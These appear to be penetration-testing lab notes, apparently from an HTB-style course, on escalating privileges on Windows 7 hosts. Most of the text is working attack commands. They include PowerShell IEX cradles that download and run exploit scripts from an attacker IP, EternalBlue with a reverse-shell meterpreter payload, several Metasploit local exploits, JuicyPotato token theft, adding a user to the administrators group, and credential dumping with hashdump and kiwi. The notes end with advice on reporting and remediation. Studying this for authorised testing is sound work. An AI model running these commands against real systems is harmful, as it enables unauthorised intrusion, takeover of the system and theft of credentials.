## Windows 7 Legacy Assessment

Windows 7 is still widely deployed in retail (POS systems), healthcare, manufacturing, and education despite reaching EOL in January 2020.  The absence of Credential Guard, Control Flow Guard, and a fully featured Defender makes it significantly weaker than Windows 10 from both a kernel and credential security perspective. 

***

## Windows 7 vs Windows 10 - Security Gaps

| Feature | Windows 7 | Windows 10 |
|---|---|---|
| Credential Guard | No | Yes |
| Remote Credential Guard | No | Yes |
| Device Guard | No | Yes |
| Control Flow Guard | No | Yes |
| AppLocker | Partial | Yes |
| Windows Defender | Partial | Yes |
| BitLocker | Partial | Yes |
| Microsoft Passport / MFA | No | Yes |

***

## Step 1: Patch Level Enumeration

```cmd
:: Capture systeminfo output for offline analysis
systeminfo > C:\Windows\Temp\sysinfo.txt

:: Check installed hotfixes (missing = vulnerable)
wmic qfe get Caption,HotFixID,InstalledOn | sort
wmic qfe list | findstr KB

:: Quick OS and patch level summary
systeminfo | findstr /i "OS Name\|OS Version\|System Type\|Hotfix(s)"
```

***

## Step 2: Windows-Exploit-Suggester Setup and Usage

```bash
# Install Python 2.7 dependencies (use pyenv if on Pwnbox)
pyenv shell 2.7

# Minimal install route
pip2 install xlrd==1.2.0

# Update vulnerability database (downloads Excel file)
python2.7 windows-exploit-suggester.py --update
# Creates: 2024-xx-xx-mssb.xls

# Run against captured systeminfo
python2.7 windows-exploit-suggester.py \
    --database 2024-01-01-mssb.xls \
    --systeminfo sysinfo.txt

# Output legend:
# [E] = Exploit available on Exploit-DB (standalone PoC)
# [M] = Metasploit module exists
# [*] = Missing bulletin only, no known public exploit

# Filters to apply to the output:
# Remove any "Denial of Service" entries
# Remove entries marked "Not supported on 64-bit" if target is x64
# Remove IE/browser entries (only useful if browser is your attack surface)
# Prioritise [M] first, then [E] - Metasploit modules are most reliable
```

### Sherlock Alternative (Run Directly on Target)

```powershell
# Set execution policy for current process only
Set-ExecutionPolicy Bypass -Scope Process -Force

# Load Sherlock from HTTP server (no file write needed)
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/Sherlock.ps1')
Find-AllVulns

# Key statuses:
# VulnStatus : Appears Vulnerable    <- pursue this
# VulnStatus : Not Vulnerable        <- skip
# VulnStatus : Not supported on 64-bit  <- skip on x64 targets
```

***

## Step 3: Key Windows 7 Privilege Escalation Modules

### MS16-032 - Secondary Logon Service Race Condition

The Secondary Logon service (`seclogon`) fails to sanitise standard handles when creating processes. A race condition lets an attacker steal an elevated token. Requires PowerShell 2.0+ and at least 2 CPU cores. 

```powershell
# PowerShell standalone PoC (no Metasploit)
Set-ExecutionPolicy Bypass -Scope Process -Force
Import-Module .\Invoke-MS16-032.ps1
Invoke-MS16-032
# Spawns a SYSTEM cmd.exe window

# With a custom command instead of interactive shell
Invoke-MS16-032 -Command "net localgroup administrators htb-student /add"

# Load from attack machine (no file write)
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/Invoke-MS16032.ps1')
Invoke-MS16-032
```

```
# Metasploit module
msf6 > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
msf6 > set SESSION 1
msf6 > set LHOST 10.10.14.3
msf6 > set LPORT 4443
msf6 > exploit
# Result: NT AUTHORITY\SYSTEM
```

### MS10-015 KiTrap0D - Works on 32-bit Windows 7 Only

```
msf6 > use exploit/windows/local/ms10_015_kitrap0d
msf6 > set SESSION 1
msf6 > exploit
# Note: x86 only - migrate to 32-bit process first if needed
```

### MS13-053 - Win32k Kernel Pool Overflow

```
msf6 > use exploit/windows/local/ms13_053_schlamperei
msf6 > set SESSION 1
msf6 > set LHOST 10.10.14.3
msf6 > set LPORT 4444
msf6 > exploit
```

### MS15-051 - Win32k ClientCopyImage

```
msf6 > use exploit/windows/local/ms15_051_client_copy_image
msf6 > set SESSION 1
msf6 > set LHOST 10.10.14.3
msf6 > set LPORT 4445
msf6 > exploit
# Tested on Windows 7 x64 and x86, Server 2008 R2 SP1 x64
```

### MS14-058 - TrackPopupMenu Win32k

```
msf6 > use exploit/windows/local/ms14_058_track_popup_menu
msf6 > set SESSION 1
msf6 > exploit
```

### EternalBlue (MS17-010) - If SMBv1 is Running

Windows 7 runs SMBv1 by default and is highly likely to be vulnerable if not specifically patched. EternalBlue often gives direct SYSTEM without needing local escalation. 
```bash
# Confirm SMBv1 and vulnerability from attack machine
nmap -p 445 --script smb-vuln-ms17-010 <target>
nmap -p 445 --script smb-protocols <target>

# Metasploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS <target>
msf6 > set LHOST 10.10.14.3
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > exploit
# Lands directly as NT AUTHORITY\SYSTEM - no local escalation needed
```

### Token Impersonation - Hot Potato (Windows 7 Specific)

Hot Potato combines NBNS spoofing, fake WPAD proxy, and NTLM relay to steal a SYSTEM token. Specific to Windows 7 and Server 2008. 

```
# JuicyPotato also works on Windows 7
# Check for SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege
whoami /priv

# If SeImpersonatePrivilege is enabled:
.\JuicyPotato.exe -l 1337 -p cmd.exe -t * -c "{CLSID}"
# CLSIDs for Windows 7: https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_7_Enterprise
```

***

## Step 4: Metasploit Local Exploit Suggester (Fastest Method with Meterpreter)

```
# After getting any Meterpreter session
msf6 > use post/multi/recon/local_exploit_suggester
msf6 > set SESSION 1
msf6 > set SHOWDESCRIPTION true
msf6 > run

# Output example:
# [+] exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target appears to be vulnerable.
# [+] exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
# [+] exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.

# Run the top suggestion immediately:
msf6 > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
msf6 > set SESSION 1
msf6 > set LHOST 10.10.14.3
msf6 > run
```

***

## Full Windows 7 Attack Workflow

```
Enumerate target
         |
         v
1. Check if SMBv1 enabled
   nmap -p 445 --script smb-vuln-ms17-010 <target>
   If vulnerable -> EternalBlue -> direct SYSTEM (skip local escalation)
         |
         v
2. If already on box as low-priv user:
   systeminfo > sysinfo.txt
   wmic qfe get HotFixID,InstalledOn
         |
         v
3. Run Windows-Exploit-Suggester (attack machine) against sysinfo.txt
   AND
   IEX Sherlock.ps1 on target
   Note all "Appears Vulnerable" / [M] [E] results
         |
         v
4. Get Meterpreter session for Metasploit modules
   use exploit/windows/smb/smb_delivery
   target = DLL -> rundll32.exe \\attacker\share\test.dll,0
         |
         v
5. Confirm architecture
   meterpreter > ps -> find x64 process -> migrate
         |
         v
6. Run local_exploit_suggester
   use post/multi/recon/local_exploit_suggester
         |
         v
7. Try modules in order of confidence:
   Priority 1: ms16_032 (most reliable, works x86+x64, PowerShell)
   Priority 2: ms15_051_client_copy_image
   Priority 3: ms13_053_schlamperei
   Priority 4: ms10_015_kitrap0d (x86 only)
         |
         v
8. Confirm: getuid -> NT AUTHORITY\SYSTEM
   Post-exploit:
   hashdump / run post/windows/gather/smart_hashdump
   load kiwi -> creds_all
   run post/multi/recon/local_exploit_suggester (verify further escalation paths)
         |
         v
9. Document for report:
   Missing KB number + CVE/MS bulletin
   Screenshot of getuid showing SYSTEM
   Recommend: Apply KB<number> immediately or decommission/segment
```
